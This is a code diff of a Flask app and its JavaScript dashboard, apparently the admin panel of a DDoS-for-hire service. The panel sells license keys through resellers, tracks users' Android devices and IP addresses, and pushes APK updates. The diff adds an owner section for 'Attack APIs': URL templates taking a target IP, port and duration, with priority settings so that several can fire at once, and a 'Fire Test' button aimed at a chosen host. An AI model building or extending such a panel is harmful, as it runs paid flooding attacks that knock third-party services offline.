   empty:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7l9-4 9 4-9 4-9-4z"/><path d="M3 12l9 4 9-4M3 17l9 4 9-4"/></svg>',
+  bolt:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>',
 };
 
-// ═══════════════════════════════════════════
+</script>
+<script>
 // OWNER DASHBOARD
-// ═══════════════════════════════════════════
 async function renderOwnerDashboard(){
 const allKeys=await api('/api/keys');
 const resellers=await api('/api/resellers');
 const history=await api('/api/history');
 const now=new Date();
 const nowMs=Date.now();
-const LIVE_WINDOW=120000; // 2 minutes
+const LIVE_WINDOW=120000;
 const keys=allKeys;
 let activeKeys=0,expiredKeys=0,totalDevices=0,liveDevices=0;
 allKeys.forEach(k=>{
@@ -909,6 +784,16 @@ container.innerHTML=`
 <tbody>${keys.map(k=>{const x=k.expires_at?new Date(k.expires_at)<now:false;const unredeemed=!k.redeemed;const statusBadge=x?'<span class="badge badge-expired">Expired</span>':(unredeemed?'<span class="badge badge-unredeemed">Pending</span>':'<span class="badge badge-active">Active</span>');const timeCell=k.expires_at?`<span class="countdown" data-exp="${k.expires_at}">…</span>`:'<span style="color:#9ca3af;font-size:11px">awaits redeem</span>';const liveCount=Object.values(k.devices_info||{}).filter(d=>d.last_seen&&(nowMs-new Date(d.last_seen).getTime())<LIVE_WINDOW).length;const liveDot=liveCount>0?`<span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#10b981;box-shadow:0 0 6px #10b981;animation:pulse 1.5s infinite;margin-right:5px" title="${liveCount} live"></span>`:'';return`<tr><td><strong>${k.name}</strong></td><td class="mono" style="cursor:pointer" onclick="copyKey('${k.key}')" title="Click to copy">${k.key}</td><td>${statusBadge}</td><td>${timeCell}</td><td>${liveDot}${(k.locked_device_ids||[]).length}/${k.device_limit}${liveCount>0?`<span style="color:#10b981;font-size:10px;font-weight:600;margin-left:4px">(${liveCount} live)</span>`:''}</td><td>${k.generated_by||'owner'}</td><td><button class="btn btn-blue" style="padding:6px 12px;font-size:11px" onclick="showDevices('${k.id}',this)">📱 Devices</button> <button class="btn btn-green" style="padding:6px 12px;font-size:11px" onclick="showExtendKey('${k.id}','${k.name}')">⏱️ Extend</button></td><td><button class="btn btn-red" style="padding:6px 12px;font-size:11px" onclick="deleteKey('${k.id}')">Delete</button></td></tr>`}).join('')||`<tr><td colspan="8"><div class="empty"><div class="empty-icon">${ICONS.empty}</div><p>No keys yet</p><span>Generate your first key above</span></div></td></tr>`}</tbody></table></div>
 </div>
 
+<div class="section" id="attackApisSection">
+<div class="section-head">
+<div class="se-icon" style="background:linear-gradient(135deg,#f59e0b,#ea580c);box-shadow:0 4px 12px rgba(245,158,11,.25)">${ICONS.bolt}</div>
+<div class="se-text"><h3>⚡ Attack APIs</h3><p>Manage attack API endpoints</p></div>
+<div class="se-spacer"></div>
+<button class="btn btn-orange" style="padding:8px 14px;font-size:12px" onclick="showAddAttackApi()">+ Add API</button>
+</div>
+<div id="attackApisTable">Loading...</div>
+</div>
+
 <div class="section">
 <div class="section-head">
 <div class="se-icon" style="background:linear-gradient(135deg,#3b82f6,#1d4ed8);box-shadow:0 4px 12px rgba(59,130,246,.25)">${ICONS.rate}</div>
@@ -916,22 +801,133 @@ container.innerHTML=`
 </div>
 <div style="display:flex;gap:10px;flex-wrap:wrap">
 <button class="btn btn-purple" onclick="showHistory()">📜 Key History</button>
-<button class="btn btn-blue" onclick="showUpdateConfig()">⬆️ App Update Settings</button>
-<button class="btn btn-green" onclick="showAttackApis()">⚡ Attack APIs</button>
 </div>
 </div>`;
+loadAttackApis();
 }
 
-// ═══════════════════════════════════════════
+// ATTACK APIs SECTION
+async function loadAttackApis(){
+const apis=await api('/api/attack-apis');
+const el=document.getElementById('attackApisTable');
+if(!el)return;
+if(apis.length===0){
+el.innerHTML=`<div class="empty"><div class="empty-icon">${ICONS.bolt}</div><p>No Attack APIs configured</p><span>Add your first API above</span></div>`;
+return;
+}
+el.innerHTML=`<div class="table-wrap"><table><thead><tr><th>Name</th><th>URL Template</th><th>Status</th><th>Priority</th><th>Actions</th></tr></thead><tbody>${apis.map(a=>`<tr>
+<td><strong>${a.name}</strong></td>
+<td class="mono" style="font-size:11px;max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${a.url||a.base_url||''}</td>
+<td>${a.enabled?'<span class="badge badge-enabled">Enabled</span>':'<span class="badge badge-disabled">Disabled</span>'}</td>
+<td>${a.priority}</td>
+<td style="white-space:nowrap">
+<button class="btn btn-blue" style="padding:5px 10px;font-size:11px" onclick="showEditAttackApi('${a.id}')">Edit</button>
+<button class="btn btn-green" style="padding:5px 10px;font-size:11px" onclick="testAttackApi('${a.id}')">Test</button>
+<button class="btn btn-orange" style="padding:5px 10px;font-size:11px" onclick="toggleAttackApi('${a.id}',${!a.enabled})">${a.enabled?'Disable':'Enable'}</button>
+<button class="btn btn-red" style="padding:5px 10px;font-size:11px" onclick="deleteAttackApi('${a.id}')">Del</button>
+</td></tr>`).join('')}</tbody></table></div>`;
+}
+
+function showAddAttackApi(){
+showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
+<h3>⚡ Add Attack API</h3>
+<p style="font-size:12px;color:#888;margin-bottom:14px">URL mein {ip}, {port}, {time} placeholders use karo. Priority 0 = sab ek saath fire.</p>
+<div class="form-grid" style="grid-template-columns:1fr">
+<div class="form-group"><label>Name</label><input id="aaName" placeholder="API 1"></div>
+<div class="form-group"><label>URL Template</label><input id="aaUrl" placeholder="https://example.com/api?ip={ip}&port={port}&time={time}&key=XXX"></div>
+<div class="form-group" style="display:grid;grid-template-columns:1fr 1fr;gap:10px"><div><label>Priority (0=all together, 1+=one by one)</label><input id="aaPriority" type="number" value="0" min="0"></div><div><label>Timeout (sec)</label><input id="aaTimeout" type="number" value="12" min="1"></div></div>
+</div>
+<button class="btn btn-green" style="margin-top:14px;width:100%" onclick="addAttackApi()">Add API</button>
+<div id="aaResult" style="margin-top:12px;font-size:13px"></div>`);
+}
+
+async function addAttackApi(){
+const body={
+  name:document.getElementById('aaName').value,
+  url:document.getElementById('aaUrl').value,
+  priority:parseInt(document.getElementById('aaPriority').value)||1,
+  timeout:parseInt(document.getElementById('aaTimeout').value)||12
+};
+const r=await api('/api/attack-apis/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+if(r.error){document.getElementById('aaResult').innerHTML=`<span style="color:#dc2626">⚠️ ${r.error}</span>`;return;}
+document.getElementById('aaResult').innerHTML='<span style="color:#10b981">✅ API added!</span>';
+setTimeout(()=>{closeModal();loadAttackApis();},600);
+}
+
+async function showEditAttackApi(id){
+const apis=await api('/api/attack-apis');
+const a=apis.find(x=>x.id===id);
+if(!a)return;
+showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
+<h3>✏️ Edit Attack API</h3>
+<div class="form-grid" style="grid-template-columns:1fr">
+<div class="form-group"><label>Name</label><input id="eaName" value="${a.name}"></div>
+<div class="form-group"><label>URL Template</label><input id="eaUrl" value="${a.url||a.base_url||''}"></div>
+<div class="form-group" style="display:grid;grid-template-columns:1fr 1fr;gap:10px"><div><label>Priority (0=together)</label><input id="eaPriority" type="number" value="${a.priority||0}" min="0"></div><div><label>Timeout (sec)</label><input id="eaTimeout" type="number" value="${a.timeout||12}" min="1"></div></div>
+</div>
+<button class="btn btn-blue" style="margin-top:14px;width:100%" onclick="updateAttackApi('${id}')">Update API</button>
+<div id="eaResult" style="margin-top:12px;font-size:13px"></div>`);
+}
+
+async function updateAttackApi(id){
+const body={
+  id:id,
+  name:document.getElementById('eaName').value,
+  url:document.getElementById('eaUrl').value,
+  priority:parseInt(document.getElementById('eaPriority').value)||1,
+  timeout:parseInt(document.getElementById('eaTimeout').value)||12
+};
+const r=await api('/api/attack-apis/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+if(r.error){document.getElementById('eaResult').innerHTML=`<span style="color:#dc2626">⚠️ ${r.error}</span>`;return;}
+document.getElementById('eaResult').innerHTML='<span style="color:#10b981">✅ Updated!</span>';
+setTimeout(()=>{closeModal();loadAttackApis();},600);
+}
+
+async function toggleAttackApi(id,enabled){
+const r=await api('/api/attack-apis/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,enabled})});
+if(!r.error)loadAttackApis();
+}
+
+async function deleteAttackApi(id){
+if(!confirm('Delete this Attack API?'))return;
+const r=await api('/api/attack-apis/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});
+if(!r.error)loadAttackApis();
+}
+
+async function testAttackApi(id){
+showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
+<h3>🧪 Test Attack API</h3>
+<p style="font-size:13px;color:#888;margin-bottom:16px">Send a test request to verify API works</p>
+<div class="form-grid" style="grid-template-columns:1fr 1fr 1fr">
+<div class="form-group"><label>Host/IP</label><input id="taHost" value="1.1.1.1"></div>
+<div class="form-group"><label>Port</label><input id="taPort" value="80"></div>
+<div class="form-group"><label>Time (sec)</label><input id="taTime" value="10"></div>
+</div>
+<button class="btn btn-orange" style="margin-top:14px;width:100%" onclick="fireTestAttack('${id}')">🚀 Fire Test</button>
+<div id="taResult" style="margin-top:12px;font-size:13px"></div>`);
+}
+
+async function fireTestAttack(id){
+document.getElementById('taResult').innerHTML='<span style="color:#f59e0b">⏳ Sending...</span>';
+const body={
+  id:id,
+  host:document.getElementById('taHost').value,
+  port:document.getElementById('taPort').value,
+  time:document.getElementById('taTime').value
+};
+const r=await api('/api/attack-apis/test',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+if(r.error){document.getElementById('taResult').innerHTML=`<span style="color:#dc2626">⚠️ ${r.error}</span>`;return;}
+document.getElementById('taResult').innerHTML=`<div style="padding:12px;background:#f0fdf4;border-left:3px solid #10b981;border-radius:8px;color:#065f46">✅ ${r.message||'Test sent!'}<br><small style="color:#888">Status: ${r.status_code||'N/A'}</small></div>`;
+}
+
 // RESELLER DASHBOARD
-// ═══════════════════════════════════════════
 async function renderResellerDashboard(){
 const data=await api('/api/my-dashboard');
 const keys=data.keys||[];
 const credits=data.credits||0;
 const now=new Date();
 const nowMs=Date.now();
-const LIVE_WINDOW=120000; // 2 minutes
+const LIVE_WINDOW=120000;
 let active=0,liveDevices=0;
 keys.forEach(k=>{
   if(new Date(k.expires_at)>now)active++;
@@ -989,9 +985,7 @@ container.innerHTML=`
 </div>`;
 }
 
-// ═══════════════════════════════════════════
 // ACTIONS
-// ═══════════════════════════════════════════
 async function generateKey(){
 const r=await api('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:document.getElementById('kName').value,duration_value:document.getElementById('kDur').value,duration_unit:document.getElementById('kUnit').value,device_limit:document.getElementById('kDev').value})});
 document.getElementById('genResult').innerHTML=r.error?`<span style="color:#dc2626">⚠️ ${r.error}</span>`:`<div style="padding:12px 14px;background:#f0fdf4;border-left:3px solid #10b981;border-radius:8px;color:#065f46">✅ Generated: <strong style="color:#10b981;cursor:pointer" onclick="copyKey('${r.key}')">${r.key}</strong></div>`;
@@ -1010,13 +1004,11 @@ async function removeDevice(keyId,deviceId){
   if(!confirm('Remove this device? User will be logged out and can re-login from another device.'))return;
   const r=await api('/api/remove-device',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:keyId,device_id:deviceId})});
   if(r.error){alert(r.error);return}
-  // refresh the device dropdown for this key
   const row=document.getElementById('dev_'+keyId);
   if(row)row.remove();
   render();
 }
 
-// ── Extend a single key ──
 function showExtendKey(keyId,keyName){
 showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
 <h3>⏱️ Extend Key Time</h3>
@@ -1038,7 +1030,6 @@ document.getElementById('exResult').innerHTML='<span style="color:#10b981">✅ T
 setTimeout(()=>{closeModal();render();},700);
 }
 
-// ── Extend ALL keys ──
 function showExtendAll(username){
 showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
 <h3>⏱️ Extend ALL Keys</h3>
@@ -1081,7 +1072,7 @@ render();
 async function showResellerList(){
 const resellers=await api('/api/resellers');
 let html=`<button class="close-btn" onclick="closeModal()">&times;</button><h3>👥 Resellers</h3><div class="table-wrap"><table><thead><tr><th>Name</th><th>Credits</th><th>Add</th><th></th></tr></thead><tbody>`;
-resellers.forEach(r=>{html+=`<tr><td><a href="#" onclick="viewResellerDash('${r.username}');closeModal()" style="color:#6366f1;text-decoration:none;font-weight:600">${r.display_name}</a></td><td><span class="credit-badge">${r.credits}</span></td><td><input id="cr_${r.username}" type="number" value="100" style="width:75px;padding:6px 8px;background:#f9fafb;border:1.5px solid #e5e7eb;border-radius:8px;color:#1a1a2e;font-size:12px;font-family:inherit"><button class="btn btn-blue" style="padding:5px 10px;margin-left:6px;font-size:11px" onclick="addCredits('${r.username}')">+</button></td><td><button class="btn btn-red" style="padding:5px 10px;font-size:11px" onclick="deleteReseller('${r.username}')">Del</button></td></tr>`;});
+resellers.forEach(r=>{html+=`<tr><td><a href="#" onclick="viewResellerDash('${r.username}');closeModal()" style="color:#6366f1;text-decoration:none;font-weight:600">${r.display_name}</a></td><td><span class="credit-badge">${r.credits}</span></td><td><input id="cr_${r.username}" type="number" value="100" style="width:75px;padding:6px 8px;background:var(--surface-2);border:1.5px solid var(--border-2);border-radius:8px;color:var(--text);font-size:12px;font-family:inherit"><button class="btn btn-blue" style="padding:5px 10px;margin-left:6px;font-size:11px" onclick="addCredits('${r.username}')">+</button></td><td><button class="btn btn-red" style="padding:5px 10px;font-size:11px" onclick="deleteReseller('${r.username}')">Del</button></td></tr>`;});
 html+=`</tbody></table></div>`;
 showModal(html);
 }
@@ -1091,10 +1082,12 @@ await api('/api/add-credits',{method:'POST',headers:{'Content-Type':'application
 showResellerList();
 }
 async function deleteReseller(username){if(!confirm('Delete reseller '+username+'?'))return;await api('/api/delete-reseller',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username})});closeModal();render();}
+
 async function viewResellerDash(username){
 const data=await api('/api/reseller-dashboard?username='+username);
 const keys=data.keys||[];const now=new Date();const nowMs=Date.now();
 const history=await api('/api/history?by='+username);
+const LIVE_WINDOW=120000;
 let liveDevices=0;
 keys.forEach(k=>{Object.values(k.devices_info||{}).forEach(info=>{if(info.last_seen&&(nowMs-new Date(info.last_seen).getTime())<LIVE_WINDOW)liveDevices++;});});
 container.innerHTML=`
@@ -1123,12 +1116,11 @@ container.innerHTML=`
 <div class="section"><div class="section-head"><div class="se-icon" style="background:linear-gradient(135deg,#3b82f6,#1d4ed8);box-shadow:0 4px 12px rgba(59,130,246,.25)">${ICONS.rate}</div><div class="se-text"><h3>Key History</h3><p>All-time generated keys</p></div></div><div class="table-wrap" style="max-height:340px;overflow-y:auto"><table><thead><tr><th>Key</th><th>Created</th><th>Duration</th></tr></thead><tbody>${history.map(h=>`<tr><td class="mono">${h.key}</td><td>${new Date(h.created_at).toLocaleString()}</td><td>${h.duration_value} ${h.duration_unit}</td></tr>`).join('')||`<tr><td colspan="3"><div class="empty"><div class="empty-icon">${ICONS.empty}</div><p>No history</p></div></td></tr>`}</tbody></table></div></div>`;
 }
 
-// Helper — delete key from reseller-dash view, then re-open same view
 async function deleteKeyFromResellerView(keyId, username){
   if(!confirm('Delete this key permanently?'))return;
   const r=await api('/api/delete-key',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:keyId})});
   if(r.error){alert(r.error);return}
-  viewResellerDash(username); // refresh same view
+  viewResellerDash(username);
 }
 
 async function showHistory(){
@@ -1142,7 +1134,7 @@ showModal(html);
 
 async function showDevices(keyId,btn){
 const row=document.getElementById('dev_'+keyId);
-if(row){row.remove();return}// toggle off if already open
+if(row){row.remove();return}
 const keys=await api('/api/keys');
 const key=keys.find(k=>k.id===keyId);
 if(!key)return;
@@ -1150,7 +1142,7 @@ const devInfo=key.devices_info||{};
 const devices=Object.entries(devInfo);
 const colspan=ROLE==='owner'?8:7;
 const now=Date.now();
-const LIVE_WINDOW=120000; // 2 minutes
+const LIVE_WINDOW=120000;
 function statusFor(info){
   if(!info.last_seen)return '<span style="display:inline-flex;align-items:center;gap:5px;color:#9ca3af;font-size:11px;font-weight:600">⚪ Never</span>';
   const ago=now-new Date(info.last_seen).getTime();
@@ -1168,98 +1160,21 @@ function lastSeenStr(info){
   return Math.floor(ago/86400)+'d ago';
 }
 let html='';
-if(devices.length===0){html=`<td colspan="${colspan}" style="padding:18px;background:#fafbff;color:#9ca3af;font-size:13px;text-align:center">📱 No devices connected yet.</td>`}
-else{html=`<td colspan="${colspan}" style="padding:0;background:#fafbff"><table style="width:100%;margin:0"><thead><tr style="background:#f3f4f6"><th style="font-size:10px;padding:8px">#</th><th style="font-size:10px;padding:8px">Status</th><th style="font-size:10px;padding:8px">Model</th><th style="font-size:10px;padding:8px">Android</th><th style="font-size:10px;padding:8px">Battery</th><th style="font-size:10px;padding:8px">First Seen</th><th style="font-size:10px;padding:8px">Last Seen</th><th style="font-size:10px;padding:8px">Device ID</th><th style="font-size:10px;padding:8px">Action</th></tr></thead><tbody>${devices.map(([id,info],i)=>{const batt=info.battery_level?parseInt(info.battery_level):null;const battColor=batt===null?'#9ca3af':batt>60?'#10b981':batt>20?'#f59e0b':'#dc2626';const battIcon=batt===null?'—':batt>75?'🔋':batt>20?'🪫':'🪫';const battText=batt===null?'—':`<span style="color:${battColor};font-weight:700">${battIcon} ${batt}%</span>`;return `<tr><td style="font-size:12px;padding:8px;color:#6366f1;font-weight:700">${i+1}</td><td style="padding:8px">${statusFor(info)}</td><td style="font-size:12px;padding:8px"><strong>${info.model||'Unknown'}</strong></td><td style="font-size:12px;padding:8px">${info.android_version||'—'}</td><td style="font-size:12px;padding:8px">${battText}</td><td style="font-size:11px;padding:8px;color:#6b7280">${info.first_seen?new Date(info.first_seen).toLocaleString():'—'}</td><td style="font-size:11px;padding:8px;color:#6b7280" title="${info.last_seen||''}">${lastSeenStr(info)}</td><td class="mono" style="font-size:10px;padding:8px">${id.substring(0,18)}…</td><td style="padding:8px"><button class="btn btn-red" style="padding:5px 10px;font-size:10px" onclick="removeDevice('${keyId}','${id}')">🚫 Remove</button></td></tr>`}).join('')}</tbody></table></td>`}
+if(devices.length===0){html=`<td colspan="${colspan}" style="padding:18px;background:var(--surface-2);color:#9ca3af;font-size:13px;text-align:center">📱 No devices connected yet.</td>`}
+else{
+  html=`<td colspan="${colspan}" style="padding:0;border:none"><div style="background:var(--surface-2);border-radius:10px;padding:14px;margin:8px 4px"><table style="width:100%"><thead><tr style="background:transparent"><th style="font-size:10px;padding:6px 8px">Device</th><th style="font-size:10px;padding:6px 8px">Android</th><th style="font-size:10px;padding:6px 8px">Battery</th><th style="font-size:10px;padding:6px 8px">IP</th><th style="font-size:10px;padding:6px 8px">Status</th><th style="font-size:10px;padding:6px 8px">Last Seen</th><th style="font-size:10px;padding:6px 8px"></th></tr></thead><tbody>`;
+  devices.forEach(([did,info])=>{
+    html+=`<tr><td style="font-size:12px;padding:6px 8px">${info.model||'Unknown'}</td><td style="font-size:12px;padding:6px 8px">${info.android_version||'—'}</td><td style="font-size:12px;padding:6px 8px">${info.battery_level?info.battery_level+'%':'—'}</td><td style="font-size:12px;padding:6px 8px;font-family:monospace">${info.ip_address||'—'}</td><td style="font-size:12px;padding:6px 8px">${statusFor(info)}</td><td style="font-size:12px;padding:6px 8px">${lastSeenStr(info)}</td><td style="padding:6px 8px"><button class="btn btn-red" style="padding:4px 8px;font-size:10px" onclick="removeDevice('${keyId}','${did}')">Remove</button></td></tr>`;
+  });
+  html+=`</tbody></table></div></td>`;
+}
 const tr=document.createElement('tr');
 tr.id='dev_'+keyId;
 tr.innerHTML=html;
-const parentRow=btn.closest('tr');
-parentRow.parentNode.insertBefore(tr,parentRow.nextSibling);
+btn.closest('tr').after(tr);
 }
 
-function copyKey(key){navigator.clipboard.writeText(key).then(()=>{const t=document.createElement('div');t.textContent='✅ Key Copied!';t.style.cssText='position:fixed;top:20px;right:20px;background:linear-gradient(135deg,#10b981,#059669);color:#fff;padding:12px 22px;border-radius:12px;font-size:13px;font-weight:600;z-index:9999;box-shadow:0 8px 24px rgba(16,185,129,.4);animation:fadeOut 2s forwards';document.body.appendChild(t);setTimeout(()=>t.remove(),2000)}).catch(()=>prompt('Copy this key:',key))}
-
-async function showUpdateConfig(){
-const config=await api('/api/update-config');
-showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
-<h3>⬆️ App Update Settings</h3>
-<p style="font-size:13px;color:#6b7280;margin-bottom:18px">Upload new APK here. Users will see update popup in app.</p>
-<form id="updateForm" enctype="multipart/form-data">
-<div class="form-group" style="margin-bottom:14px"><label>Version Code (next: ${config.latest_version_code} → ${config.latest_version_code+1})</label><input id="uVerCode" type="number" value="${config.latest_version_code+1}"></div>
-<div class="form-group" style="margin-bottom:14px"><label>Version Name</label><input id="uVerName" value="${config.latest_version_name}"></div>
-<div class="form-group" style="margin-bottom:14px"><label>Changelog</label><input id="uChangelog" value="${config.changelog||''}" placeholder="e.g. Bug fixes, new UI"></div>
-<div class="form-group" style="margin-bottom:14px"><label>APK File</label><input id="uApkFile" type="file" accept=".apk" style="padding:10px"></div>
-${config.has_apk?'<p style="font-size:12px;color:#10b981;margin-bottom:14px;background:#f0fdf4;padding:8px 12px;border-radius:8px;font-weight:600">✅ Current APK: '+config.apk_filename+'</p>':''}
-<button type="button" class="btn btn-green" style="width:100%" onclick="uploadUpdate()">⬆️ Upload & Publish Update</button>
-</form>
-<div id="uResult" style="margin-top:12px;font-size:13px"></div>`);
-}
-
-// ═══════════════════════════════════════════
-// ATTACK API MANAGEMENT — Add/Edit/Delete from Dashboard
-// ═══════════════════════════════════════════
-async function showAttackApis(){
-const apis=await api('/api/attack-apis');
-let rows='';
-if(apis.length===0){rows='<p style="color:#9ca3af;text-align:center;padding:20px">No APIs configured yet. Add one below.</p>'}
-else{rows=apis.map(a=>`<div style="display:flex;align-items:center;gap:10px;padding:12px;margin-bottom:8px;background:${a.enabled?'#f0fdf4':'#fef2f2'};border:1px solid ${a.enabled?'#bbf7d0':'#fecaca'};border-radius:10px">
-<div style="flex:1;min-width:0">
-<div style="font-weight:700;font-size:13px;color:${a.enabled?'#065f46':'#991b1b'}">${a.enabled?'🟢':'🔴'} ${a.name} <span style="font-weight:400;color:#9ca3af;font-size:11px">(Priority: ${a.priority})</span></div>
-<div style="font-size:11px;color:#6b7280;margin-top:4px;word-break:break-all;font-family:monospace">${a.url.substring(0,80)}${a.url.length>80?'...':''}</div>
-</div>
-<button class="btn ${a.enabled?'btn-red':'btn-green'}" style="padding:5px 10px;font-size:10px;white-space:nowrap" onclick="toggleApi('${a.id}',${!a.enabled})">${a.enabled?'Disable':'Enable'}</button>
-<button class="btn btn-red" style="padding:5px 10px;font-size:10px" onclick="deleteApi('${a.id}')">🗑️</button>
-</div>`).join('')}
-
-showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
-<h3>⚡ Attack APIs</h3>
-<p style="font-size:13px;color:#6b7280;margin-bottom:14px">Add your attack API URLs here. Use <code>{ip}</code> <code>{port}</code> <code>{time}</code> as placeholders.</p>
-<div id="apiList" style="max-height:250px;overflow-y:auto;margin-bottom:16px">${rows}</div>
-<div style="border-top:1px solid #e5e7eb;padding-top:16px">
-<div class="form-group" style="margin-bottom:10px"><label>API Name</label><input id="aName" placeholder="e.g. MyGodX"></div>
-<div class="form-group" style="margin-bottom:10px"><label>API URL (use {ip} {port} {time})</label><input id="aUrl" placeholder="https://api.com/attack?target={ip}&port={port}&time={time}&key=YOUR_KEY" style="font-family:monospace;font-size:11px"></div>
-<div class="form-group" style="margin-bottom:10px"><label>Priority (1=highest)</label><input id="aPriority" type="number" value="1" min="1" max="10"></div>
-<button type="button" class="btn btn-green" style="width:100%" onclick="addApi()">➕ Add API</button>
-</div>
-<div id="aResult" style="margin-top:12px;font-size:13px"></div>`);
-}
-async function addApi(){
-const name=document.getElementById('aName').value.trim();
-const url=document.getElementById('aUrl').value.trim();
-const priority=parseInt(document.getElementById('aPriority').value)||1;
-if(!name||!url){document.getElementById('aResult').innerHTML='<span style="color:#dc2626">⚠️ Name and URL required</span>';return}
-if(!url.includes('{ip}')||!url.includes('{port}')||!url.includes('{time}')){document.getElementById('aResult').innerHTML='<span style="color:#dc2626">⚠️ URL must contain {ip}, {port}, {time}</span>';return}
-document.getElementById('aResult').innerHTML='<span style="color:#3b82f6">⏳ Adding...</span>';
-const r=await api('/api/attack-apis/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,url,priority})});
-if(r.error){document.getElementById('aResult').innerHTML='<span style="color:#dc2626">⚠️ '+r.error+'</span>'}
-else{document.getElementById('aResult').innerHTML='<span style="color:#10b981">✅ API Added!</span>';setTimeout(()=>showAttackApis(),800)}
-}
-async function toggleApi(id,enabled){
-await api('/api/attack-apis/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,enabled})});
-showAttackApis();
-}
-async function deleteApi(id){
-if(!confirm('Delete this API?'))return;
-await api('/api/attack-apis/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});
-showAttackApis();
-}
-async function uploadUpdate(){
-const form=new FormData();
-const file=document.getElementById('uApkFile').files[0];
-if(!file){document.getElementById('uResult').innerHTML='<span style="color:#dc2626">⚠️ Select APK file</span>';return}
-form.append('apk_file',file);
-form.append('version_code',document.getElementById('uVerCode').value);
-form.append('version_name',document.getElementById('uVerName').value);
-form.append('changelog',document.getElementById('uChangelog').value);
-document.getElementById('uResult').innerHTML='<span style="color:#3b82f6">⏳ Uploading...</span>';
-const r=await fetch('/api/upload-apk',{method:'POST',body:form});
-const data=await r.json();
-document.getElementById('uResult').innerHTML=data.error?'<span style="color:#dc2626">⚠️ '+data.error+'</span>':'<div style="padding:10px 14px;background:#f0fdf4;border-left:3px solid #10b981;border-radius:8px;color:#065f46;font-weight:600">✅ Update published! Users will see update popup now.</div>';
-}
-
-// ═══════════════════════════════════════════
-// LIVE COUNTDOWN — updates every second
-// ═══════════════════════════════════════════
+// LIVE COUNTDOWN
 function fmtCountdown(ms){
   if(ms<=0)return '<span style="color:#dc2626;font-weight:700">EXPIRED</span>';
   const s=Math.floor(ms/1000);
@@ -1283,9 +1198,7 @@ setInterval(()=>{
 
 function render(){if(ROLE==='owner')renderOwnerDashboard();else renderResellerDashboard();}
 render();
-// Auto-refresh dashboard every 30s to keep live device status fresh
 setInterval(()=>{
-  // only refresh if no modal is open and no device dropdown is expanded
   if(!modalBg.classList.contains('active')&&!document.querySelector('[id^="dev_"]')){
     render();
   }
@@ -1295,9 +1208,9 @@ setInterval(()=>{
 </html>'''
 
 
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 # WEB ROUTES
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -1314,7 +1227,6 @@ def login():
 
         username = request.form.get('username', '').strip()
         password = request.form.get('password', '').strip()
-        # Check owner
         if username == OWNER_USER and password == OWNER_PASS:
             login_record_success(ip)
             session['logged_in'] = True
@@ -1322,7 +1234,6 @@ def login():
             session['username'] = username
             session['display_name'] = 'Owner'
             return redirect(url_for('dashboard'))
-        # Check resellers
         reseller = find_reseller(username)
         if reseller and reseller.get('password') == password:
             login_record_success(ip)
@@ -1332,7 +1243,6 @@ def login():
             session['display_name'] = reseller['display_name']
             return redirect(url_for('dashboard'))
 
-        # Failure — record and respond
         login_record_failure(ip)
         _, _, remaining = login_check_rate(ip)
         if remaining <= 0:
@@ -1345,7 +1255,6 @@ def login():
             error=f'Invalid credentials. {remaining} attempt(s) left.'
         )
 
-    # GET — show lockout banner if currently locked
     if not allowed:
         mins = retry_after // 60 + (1 if retry_after % 60 else 0)
         return render_template_string(
@@ -1367,16 +1276,16 @@ def dashboard():
         r = find_reseller(session['username'])
         credits = r['credits'] if r else 0
     return render_template_string(DASHBOARD_TEMPLATE,
-        title='VISHAL PRO Panel',
+        title='ALONExRAJ Panel',
         role=session['role'],
         username=session['username'],
         display_name=session['display_name'],
         credits=credits)
 
 
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 # API ROUTES — Dashboard data
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 
 @app.route('/api/keys')
 @login_required
@@ -1385,7 +1294,6 @@ def api_keys():
     if is_reseller():
         keys = [k for k in keys if k.get('generated_by') == session['username']]
     elif is_owner():
-        # Owner sees only their own keys (not reseller-generated) on main dashboard
         keys = [k for k in keys if k.get('generated_by') in (session['username'], 'owner')]
     return jsonify(keys)
 
@@ -1402,7 +1310,6 @@ def api_history():
     if is_reseller():
         history = [h for h in history if h.get('generated_by') == session['username']]
     else:
-        # Owner can filter by reseller username via query param
         filter_by = request.args.get('by', '')
         if filter_by:
             history = [h for h in history if h.get('generated_by') == filter_by]
@@ -1443,118 +1350,6 @@ def api_add_reseller():
     add_reseller({'username': username, 'password': password, 'display_name': display_name or username, 'credits': credits, 'created_at': datetime.utcnow().isoformat()+'Z'})
     return jsonify({'status': 'success'})
 
-
-# ══════════════════════════════════════════════════════════════════
-# ATTACK API MANAGEMENT — Add/Remove/Update APIs from Dashboard
-# No restart needed — changes apply instantly
-# ══════════════════════════════════════════════════════════════════
-
-@app.route('/api/attack-apis', methods=['GET'])
-@login_required
-@owner_required
-def get_attack_apis():
